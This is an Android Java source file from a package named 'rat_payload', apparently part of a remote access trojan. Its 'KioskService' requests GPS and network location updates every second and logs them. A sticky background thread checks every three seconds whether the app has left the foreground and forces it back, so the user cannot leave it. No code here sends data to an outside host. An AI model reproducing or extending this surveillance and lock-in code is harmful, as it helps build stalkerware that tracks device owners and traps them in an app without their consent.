package com.app.rat_payload;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;

import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Created by anirudh on 12/20/16.
 *
 *
 * Background service to restart app if it ever goes to background.
 */

public class KioskService extends Service {

    private LocationManager mLocationManager = null;
    private static final int LOCATION_INTERVAL = 1000;
    private static final float LOCATION_DISTANCE = 10f;



    // periodic interval to check in seconds -> 3 seconds
    private static final long INTERVAL = TimeUnit.SECONDS.toMillis(3);
    private static final String TAG = KioskService.class.getSimpleName();
    private static final String PREF_KIOSK_MODE = "pref_kiosk_mode";

    private Thread t = null;
    private Context ctx = null;
    private boolean running = false;


    LocationListener[] mLocationListeners = new LocationListener[] {
            new LocationListener(LocationManager.GPS_PROVIDER),
            new LocationListener(LocationManager.NETWORK_PROVIDER)
    };

    /*
    * On Create.
    *
    * */
    @Override
    public void onCreate() {
        initializeLocationManager();


        try {
            mLocationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,
                    mLocationListeners[1]);
        } catch (java.lang.SecurityException ex) {
            Log.i(TAG, "fail to request location update, ignore", ex);
        } catch (IllegalArgumentException ex) {
            Log.d(TAG, "network provider does not exist, " + ex.getMessage());
        }


        try {
            mLocationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,
                    mLocationListeners[0]);
        } catch (java.lang.SecurityException ex) {
            Log.i(TAG, "fail to request location update, ignore", ex);
        } catch (IllegalArgumentException ex) {
            Log.d(TAG, "gps provider does not exist " + ex.getMessage());
        }
    }

    /**
     * On Destroy
     *
     */
    @Override
    public void onDestroy() {
        Log.i(TAG, "Stopping service 'KioskService'");
        removeLocationListeners();
        running = false;
        super.onDestroy();
    }

    /**
     *
     * On Start
     *
     *
     * @param intent
     * @param flags
     * @param startId
     * @return
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Starting service 'KioskService'");
        running = true;
        ctx = this;

        t = new Thread(new Runnable() {
            @Override
            public void run() {

                do {
                    handleKioskMode();
                    try {
                        Thread.sleep(INTERVAL);

                    } catch (InterruptedException ie) {
                        Log.i(TAG, "THREAD INTERUPPTION: KIOSK SERVICE");
                    }
                } while (running);
                stopSelf();
            }
        });

        t.start();
        return Service.START_STICKY; //Automatically restart if the service is killed.
    }



    //Removed nullable.
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



    /**
     * Restore App from Kiosk
     *
     *
     */
    private void handleKioskMode() {
        if(isKioskModeActive(ctx)) {
            if(isInBackground()) {
                //restore app
                restoreApp();
            }
        }
    }

    /**
     * Check if app in background.
     *
     *
     * @return
     */
    private boolean isInBackground() {
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> taskInfo = am.getRunningTasks(1);
        ComponentName componentInfo = taskInfo.get(0).topActivity;

        return (!ctx.getApplicationContext().getPackageName().equals(componentInfo.getPackageName()));

    }

    /**
     * Start Main Activity
     */
    private void restoreApp() {
        Intent startMain = new Intent(ctx, MainActivity.class);
        startMain.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(startMain);
    }

    /**
     *  Check if Kiosk mode is active.
     *
     *
     * @param context
     * @return
     */
    private boolean isKioskModeActive(final Context context) {
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
        return sp.getBoolean(PREF_KIOSK_MODE, true);
    }


    private void initializeLocationManager() {
        Log.e(TAG, "initializeLocationManager");
        if (mLocationManager == null) {
            mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        }
    }

    /*
    * Remove listeners..if not shouldn't be a big deal.
    *
    * */
    private void removeLocationListeners() {
        if (mLocationManager != null) {
            for (int i = 0; i < mLocationListeners.length; i++) {
                try {
                    mLocationManager.removeUpdates(mLocationListeners[i]);
                } catch (SecurityException ex) {
                    Log.i(TAG, "fail to remove location listners, ignore", ex);
                }
            }
        }
    }



    /*
    *
    *  Location Class.
    *
    * */
    private class LocationListener implements android.location.LocationListener {

        Location mLastLocation;

        public LocationListener(String provider)
        {
            Log.e(TAG, "LocationListener " + provider);
            mLastLocation = new Location(provider);
        }


        @Override
        public void onLocationChanged(Location location) {

            Log.i(TAG, location.toString());

        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {
            System.out.println(provider + " " + status);

        }

        @Override
        public void onProviderEnabled(String provider) {

        }

        @Override
        public void onProviderDisabled(String provider) {

        }
    }






}
